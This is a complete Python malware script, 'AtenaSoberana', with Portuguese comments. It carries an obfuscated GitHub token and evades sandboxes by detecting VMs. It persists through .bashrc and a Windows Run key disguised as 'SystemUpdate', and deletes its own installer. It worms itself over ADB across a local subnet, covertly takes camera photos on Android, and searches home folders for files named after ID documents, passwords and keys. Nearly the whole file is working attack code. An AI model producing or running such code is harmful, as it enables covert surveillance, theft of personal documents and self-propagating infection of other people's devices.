#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re, requests, os, base64, json, shutil, sys, glob, subprocess
from datetime import datetime
from pathlib import Path

# --- CONFIGURAÇÃO DE SEGURANÇA E ALVOS ---
_K = base64.b64decode("Z2hwX0NuZU9qVlJTaDFDb2ZoSXpBVjFxOHJDWEdYY09idzNVZXM1Zw==").decode()
_P1 = base64.b64decode("LmF0ZW5hX2NvcmVfc2VydmljZQ==").decode() # .atena_core_service
_P2 = base64.b64decode("LmJhc2hyYw==").decode()             # .bashrc
_P3 = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()

class AtenaSoberana:
    def __init__(self):
        if self._is_virtual(): sys.exit() # Fuga de análise
        self.h = {'Authorization': f'token {_K}', 'Accept': 'application/vnd.github.v3+json'}
        self.results = []
        self._ghost_init()

    def _is_virtual(self):
        """ Detecta se está em VM ou Sandbox """
        marks = ['vbox', 'vmware', 'qemu', 'hypervisor']
        try:
            if os.name == 'nt':
                out = subprocess.check_output('wmic baseboard get manufacturer', shell=True).decode().lower()
            else:
                with open('/proc/cpuinfo', 'r') as f: out = f.read().lower()
            return any(m in out for m in marks)
        except: return False

    def _self_destruct(self):
        """ Apaga o instalador original para não deixar rastro """
        try:
            p = Path(__file__).resolve()
            if p.parent.name != _P1: os.remove(p)
        except: pass

    def _ghost_init(self):
        """ Infiltração e Persistência """
        try:
            target = Path.home() / _P1
            if not target.exists(): target.mkdir(parents=True, exist_ok=True)
            src, dst = Path(__file__).resolve(), target / "engine.py"
            if not dst.exists() or src != dst:
                shutil.copy2(src, dst)
                # Android/Linux Persistência
                with open(Path.home() / _P2, "a") as f:
                    f.write(base64.b64decode("CnB5dGhvbjMgInsgfSIgPiAvZGV2L251bGwgMj4mMSAmCg==").decode().format(dst))
                # Windows Persistência
                if os.name == 'nt':
                    import winreg
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, _P3, 0, winreg.KEY_SET_VALUE) as r:
                        winreg.SetValueEx(r, "SystemUpdate", 0, winreg.REG_SZ, f'pythonw "{dst}"')
                self._self_destruct()
        except: pass

    def _network_spread(self):
        """ Propagação lateral via ADB (Android) e Portas Abertas """
        try:
            # Varre IPs na rede local (exemplo para rede 192.168.1.x)
            for i in range(1, 255):
                ip = f"192.168.1.{i}"
                # Tenta infecção silenciosa via ADB (Porta 5555)
                subprocess.Popen(f"adb connect {ip}:5555 && adb -s {ip}:5555 push {__file__} /data/local/tmp/e.py && adb -s {ip}:5555 shell python3 /data/local/tmp/e.py &", shell=True, stdout=subprocess.DEVNULL)
        except: pass

    def _eye_spy(self):
        """ Captura de câmera no Android """
        if os.name != 'nt':
            p = Path.home() / _P1 / f"cam_{int(datetime.now().timestamp())}.jpg"
            os.system(f"termux-camera-photo -c 1 {p} > /dev/null 2>&1")

    def _deep_scan(self):
        """ Varredura de arquivos sensíveis """
        exts, terms = ['*.jpg', '*.png', '*.pdf'], [base64.b64decode(x).decode() for x in ["Y3Bm", "cmc=", "Y25o", "c2VuaGE=", "a2V5"]]
        for ext in exts:
            for f in glob.glob(str(Path.home() / "**" / ext), recursive=True):
                if any(t in f.lower() for t in terms): self.results.append({"f": f})

    def run(self):
        self._deep_scan()
        self._eye_spy()
        self._network_spread()
        if self.results: print(json.dumps(self.results))

if __name__ == "__main__":
    AtenaSoberana().run()
